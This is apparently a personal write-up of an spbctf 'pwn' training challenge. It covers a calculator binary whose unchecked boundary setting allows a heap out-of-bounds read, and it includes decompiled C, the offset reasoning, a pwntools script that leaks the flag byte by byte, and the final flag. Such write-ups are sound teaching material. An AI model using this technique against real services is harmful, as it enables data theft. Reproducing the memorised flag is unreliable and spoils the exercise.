[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_mc4)
Описание:
This is an absolutely secure calculator that just processes digits.
`nc 109.233.56.90 11714`
**[mc4.elf](https://pwn.spbctf.ru/files/heap/mc4/mc4.elf)**

Код на C:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 v4; // [rsp+3h] [rbp-5Dh] BYREF
  int lowBound; // [rsp+4h] [rbp-5Ch] BYREF
  int highBound; // [rsp+8h] [rbp-58h] BYREF
  int count; // [rsp+Ch] [rbp-54h]
  int i; // [rsp+10h] [rbp-50h]
  int i_0; // [rsp+14h] [rbp-4Ch]
  int i_1; // [rsp+18h] [rbp-48h]
  int i_2; // [rsp+1Ch] [rbp-44h]
  unsigned __int8 *numbers; // [rsp+20h] [rbp-40h]
  unsigned __int64 sum; // [rsp+28h] [rbp-38h]
  unsigned __int64 sum_0; // [rsp+30h] [rbp-30h]
  unsigned __int64 prd; // [rsp+38h] [rbp-28h]
  FILE *f; // [rsp+40h] [rbp-20h]
  char *flag; // [rsp+48h] [rbp-18h]
  char choice[4]; // [rsp+54h] [rbp-Ch] BYREF
  unsigned __int64 v19; // [rsp+58h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  count = 0;
  numbers = malloc(0);
  lowBound = 0;
  highBound = 0;
  puts("The Epic Statistics Calculator");
  f = fopen("flag.txt", "rb");

  if ( f )
  {
    flag = malloc(0x40u);
    fgets(flag, 64, f);
    fclose(f);
    while ( 1 )
    {
      printf("\nCurrently have %d numbers\n > ", count);
      for ( i = 0; i < count; ++i )
        printf("%d ", numbers[i]);
      putchar(10);
      puts("\nMENU");
      puts("a - add number");
      puts("d - delete last number");

      if ( count > 1 )
      {
        puts("A - average of numbers");
        puts("S - sum of numbers");
        puts("P - product of numbers");
      }

      if ( count > 3 )
        puts("B - set working boundaries");


      printf("choice: ");
      alarm(0x78u);
      if ( __isoc99_scanf("%1s%*c", choice) != 1 )
        break;



      if ( choice[0] == 'a' )
      {
        printf("What number to add: ");
        __isoc99_scanf("%hhd", &v4);
        numbers = realloc(numbers, ++count);
        numbers[count - 1] = v4;
        highBound = count - 1;
      }
      else if ( choice[0] == 'd' )
      {
        numbers = realloc(numbers, --count);
        highBound = count - 1;
      }
      else if ( choice[0] == 'A' && count > 1 )
      {
        sum = 0;
        for ( i_0 = lowBound; i_0 <= highBound; ++i_0 )
          sum += numbers[i_0];
        printf("Average is: %lld\n", sum / (highBound - lowBound + 1));
      }
      else if ( choice[0] == 'S' && count > 1 )
      {
        sum_0 = 0;
        for ( i_1 = lowBound; i_1 <= highBound; ++i_1 )
          sum_0 += numbers[i_1];
        printf("Sum is: %lld\n", sum_0);
      }
      else if ( choice[0] == 'P' && count > 1 )
      {
        prd = 1;
        for ( i_2 = lowBound; i_2 <= highBound; ++i_2 )
          prd *= numbers[i_2];
        printf("Product is: %lld\n", prd);
      }
      else if ( choice[0] == 'B' && count > 3 )
      {
        printf("Enter new starting position: ");
        __isoc99_scanf("%d", &lowBound);
        printf("Enter new ending position: ");
        __isoc99_scanf("%d", &highBound);
        if ( count <= lowBound || highBound < 0 )
        {
          puts("Bad boundaries!");
          lowBound = 0;
          highBound = count - 1;
        }
        printf("Now will work on numbers #%d - #%d\n", lowBound, highBound);
      }
    }
    return 0;
  }
  else
  {
    puts("Couldn't open flag.txt");
    return 1;
  }
}
```

Флаг можно считать по 1 символу, если добавить в массив 4 нуля и по чуть-чуть двигать границу.

При помощи gira можно узнать куда аллоцируются участки памяти в куче. После добавления 4-х чисел (4 нуля) массив лежит по адресу 0x4000c602a0, а флаг лежит по адресу 0x4000c604a0.
![{2F989F63-6375-44B4-B03C-0D164126B862}](../../../../z.%20Images/{2F989F63-6375-44B4-B03C-0D164126B862}.png)
![{7A074B51-9042-40BA-AE48-D3668DBFCE02}](../../../../z.%20Images/{7A074B51-9042-40BA-AE48-D3668DBFCE02}.png)
Получается 512 байт смещения.

Эксплоит:
``` python
def add_number(io, num):
    io.sendlineafter(b':', b'a')
    io.sendlineafter(b':', str(num).encode())

def set_working_boundaries(io, left, right):
    io.sendlineafter(b':', b'B')
    io.sendlineafter(b':', str(left).encode())
    io.sendlineafter(b':', str(right).encode())

def get_sum(io):
    io.sendlineafter(b':', b'S')
    io.recvuntil(b': ')
    num = int(io.recvline()[:-1].decode())
    return num

io = start()

add_number(io, 0)
add_number(io, 0)
add_number(io, 0)
add_number(io, 0)


last = get_sum(io)
for i in range(511, 512+64):
    set_working_boundaries(io, 0, i)
    print(i, chr(get_sum(io) - last))
    last = get_sum(io)

io.interactive()

```

Локальный запуск:
![{5EAF85E4-2512-4ED2-9048-B122093A78A2}](../../../../z.%20Images/{5EAF85E4-2512-4ED2-9048-B122093A78A2}.png)
При локальном запуске всё работает правильно.

На сервере же флаг начинается с 592 байт паддинга из-за разных версий библиотек, получить это значение можно путём брутфорса.
![{4FD8EB3F-9658-4B66-8FE3-31A38506A94A}](../../../../z.%20Images/{4FD8EB3F-9658-4B66-8FE3-31A38506A94A}.png)

Окончательный код цикла:
``` python
last = get_sum(io)
for i in range(591, 592+64):
    set_working_boundaries(io, 0, i)
    print(chr(get_sum(io) - last), end='', flush=True)
    last = get_sum(io)
```

Запуск:
![{659887E5-2C0F-4A8A-A963-AB9F70226EE4}](../../../../z.%20Images/{659887E5-2C0F-4A8A-A963-AB9F70226EE4}.png)

Ответ: `spbctf{6bc4035816ca210e9a0bc9adca7788e4}`